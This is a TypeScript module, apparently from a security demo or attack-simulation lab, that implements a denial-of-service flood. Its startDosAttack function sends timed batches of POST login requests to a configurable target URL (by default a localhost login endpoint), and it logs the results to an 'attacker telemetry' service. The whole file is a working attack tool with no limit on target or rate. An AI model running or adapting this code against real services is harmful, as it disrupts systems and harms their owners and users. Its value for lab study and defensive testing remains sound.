import { sendAttackerTelemetry } from '../services/telemetry.service.js';

let isDosRunning = false;
let dosInterval: NodeJS.Timeout | null = null;

export async function startDosAttack(
  targetUrl: string = 'http://localhost:3000/api/login',
  requestsPerSecond: number = 50,
  durationSeconds: number = 10
) {
  if (isDosRunning) {
    return { message: 'Đòn tấn công DoS đang được thực thi trước đó', running: true };
  }

  isDosRunning = true;
  console.log(`[DoS Attack] Bắt đầu DoS vào ${targetUrl} với tần suất ${requestsPerSecond} req/s trong ${durationSeconds}s`);

  await sendAttackerTelemetry('ATTACK_TRIGGERED', 'CRITICAL', {
    attackType: 'DOS',
    target: targetUrl,
    ratePerSecond: requestsPerSecond,
    status: 'STARTED',
    payloadExample: `Flood ${requestsPerSecond} req/s`
  });

  let totalSent = 0;
  let totalSuccess = 0;
  let totalErrors = 0;

  // Cứ mỗi 100ms gửi (requestsPerSecond / 10) request
  const batchSize = Math.max(1, Math.floor(requestsPerSecond / 10));
  const intervalMs = 100;

  dosInterval = setInterval(() => {
    for (let i = 0; i < batchSize; i++) {
      totalSent++;
      fetch(targetUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: `dos_probe_${Date.now()}_${i}`,
          password: 'dos_dummy_load'
        })
      })
        .then((res) => {
          if (res.ok) totalSuccess++;
          else totalErrors++;
        })
        .catch(() => {
          totalErrors++;
        });
    }
  }, intervalMs);

  // Tự dừng sau durationSeconds
  setTimeout(async () => {
    stopDosAttack(targetUrl, totalSent, totalSuccess, totalErrors);
  }, durationSeconds * 1000);

  return {
    status: 'started',
    target: targetUrl,
    ratePerSecond: requestsPerSecond,
    durationSeconds
  };
}

export async function stopDosAttack(
  targetUrl: string = 'http://localhost:3000/api/login',
  totalSent: number = 0,
  totalSuccess: number = 0,
  totalErrors: number = 0
) {
  if (!isDosRunning) return;

  if (dosInterval) clearInterval(dosInterval);
  isDosRunning = false;
  dosInterval = null;

  console.log(`[DoS Attack] Đã dừng DoS. Tổng đã gửi: ${totalSent}, Lỗi/Drop: ${totalErrors}`);

  await sendAttackerTelemetry('ATTACK_RESULT', 'WARNING', {
    attackType: 'DOS',
    payload: `Total sent: ${totalSent}`,
    success: totalErrors > 0,
    leakedData: {
      targetUrl,
      totalSent,
      totalSuccess,
      totalErrors
    }
  });
}
